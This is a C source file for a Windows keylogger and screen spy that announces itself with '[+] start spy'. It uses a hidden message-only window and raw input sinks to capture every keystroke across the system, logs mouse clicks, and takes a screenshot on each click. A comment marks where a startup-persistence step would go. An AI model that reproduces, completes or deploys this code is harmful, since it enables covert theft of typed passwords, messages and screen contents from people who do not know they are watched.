#include<stdio.h>
#include<windows.h>
#include<signal.h>
#include "screenshot.h"
#include "process.h"

int ABORT = 0;

void sig_handler(int signal)
{
	fprintf(stderr, "> exiting..\n");
	if (signal == SIGABRT || signal == SIGINT)
		ABORT = 1;
}

// window procedure
LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam, LPARAM lparam) {
	char rid_buffer[64] = { 0 };
	UINT rid_size = 0;
	switch (message) {
	case WM_DESTROY:
		return 0;
	case WM_INPUT:

		rid_size = sizeof(rid_buffer);

		if(GetRawInputData((HRAWINPUT)lparam, RID_INPUT, rid_buffer, &rid_size, sizeof(RAWINPUTHEADER))) {
			RAWINPUT* raw = (RAWINPUT*)rid_buffer;
			if (raw->header.dwType == RIM_TYPEKEYBOARD) {
				RAWKEYBOARD* rk = &raw->data.keyboard;
				process_kbd_event(rk->MakeCode,
					rk->Flags & RI_KEY_E0,
					rk->Flags & RI_KEY_E1,
					rk->Flags & RI_KEY_BREAK,
					rk->VKey
				);
			}
			// mouse event
			else if (raw->header.dwType == RIM_TYPEMOUSE){
				// Only log mouse button presses
				if (raw->data.mouse.usButtonFlags > 0)
				{
					char ButtonInfo[20];
					switch (raw->data.mouse.ulButtons)
					{
					case RI_MOUSE_LEFT_BUTTON_DOWN:		memcpy(ButtonInfo, "LButtonDown", 12); break;
					case RI_MOUSE_LEFT_BUTTON_UP:		memcpy(ButtonInfo, "LButtonUp", 10); break;
					case RI_MOUSE_MIDDLE_BUTTON_DOWN:	memcpy(ButtonInfo, "MButtonDown", 12); break;
					case RI_MOUSE_MIDDLE_BUTTON_UP:		memcpy(ButtonInfo, "MButtonUp", 10); break;
					case RI_MOUSE_RIGHT_BUTTON_DOWN:	memcpy(ButtonInfo, "RButtonDown", 12); break;
					case RI_MOUSE_RIGHT_BUTTON_UP:		memcpy(ButtonInfo, "RButtonUp", 10); break;
					case RI_MOUSE_BUTTON_4_DOWN:		memcpy(ButtonInfo, "Button4Down", 12); break;
					case RI_MOUSE_BUTTON_4_UP:			memcpy(ButtonInfo, "Button4Up", 10); break;
					case RI_MOUSE_BUTTON_5_DOWN:		memcpy(ButtonInfo, "Button5Down", 13); break;
					case RI_MOUSE_BUTTON_5_UP:			memcpy(ButtonInfo, "Button5Up", 11); break;
					case RI_MOUSE_WHEEL:				memcpy(ButtonInfo, "Wheel", 5); break;
					case RI_MOUSE_HWHEEL:				memcpy(ButtonInfo, "HWheel", 6); break;
					}
					printf("Mouse: Dev:%08I64x Flags:%04x Buttons:%08x(%-12s) Flags:%04x Data:%04x Raw:%04x LastX:%04x LastY:%04x Extra:%04x\r\n"
						, raw->header.hDevice
						, raw->data.mouse.usFlags
						, raw->data.mouse.ulButtons
						, ButtonInfo
						, raw->data.mouse.usButtonFlags
						, raw->data.mouse.usButtonData
						, raw->data.mouse.ulRawButtons
						, raw->data.mouse.lLastX
						, raw->data.mouse.lLastY
						, raw->data.mouse.ulExtraInformation
						);
					// capture screenshot
					CaptureAnImage(window);
				}
			}
		}
		break;
	}
	return DefWindowProc(window, message, wparam, lparam);
}


int main(int ac, char** av) {
	fprintf(stderr, "[+] start spy\n");

	// make program auto start when windows start


	//define a window class which is required to recv RAWINPUT event
	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize			= sizeof(wc);
	wc.lpfnWndProc		= wndproc;
	wc.hInstance		= GetModuleHandle(NULL);
	wc.lpszClassName	= "spyprc_wndclass";

	//register the window class
	if (!RegisterClassExA(&wc)) {
		fprintf(stderr, "[-] RegisterClassEx failed\n");
		return -1;
	}

	//create a window
	HWND spy_wnd = CreateWindowExA(0,wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
	if (!spy_wnd) {
		fprintf(stderr, "[-] CreateWindowExA failed\n");
		return -2;
	}

	// setup RAWINPUT device sink
	RAWINPUTDEVICE devs[2];
	for(int i = 0; i < 2; i++) {
		devs[i].usUsagePage = 1;
		devs[i].usUsage = i == 0 ? 6 : 2;
		devs[i].dwFlags = RIDEV_INPUTSINK;
		devs[i].hwndTarget = spy_wnd;
	}

	if (!RegisterRawInputDevices(devs, 2, sizeof(devs[0]))) {
		fprintf(stderr, "[-] RegisterRawInputDevices failed\n");
		DWORD dw = GetLastError();
		// show error message from GetLastError

		printf("error code: %d\n", dw);

		return -3;
	}

	// loop until user press Ctrl+C
	signal(SIGINT, sig_handler);
	MSG msg;
	while(!ABORT && GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// clean up
	DestroyWindow(spy_wnd);
	UnregisterClassA(wc.lpszClassName, GetModuleHandle(NULL));
	return 0;
}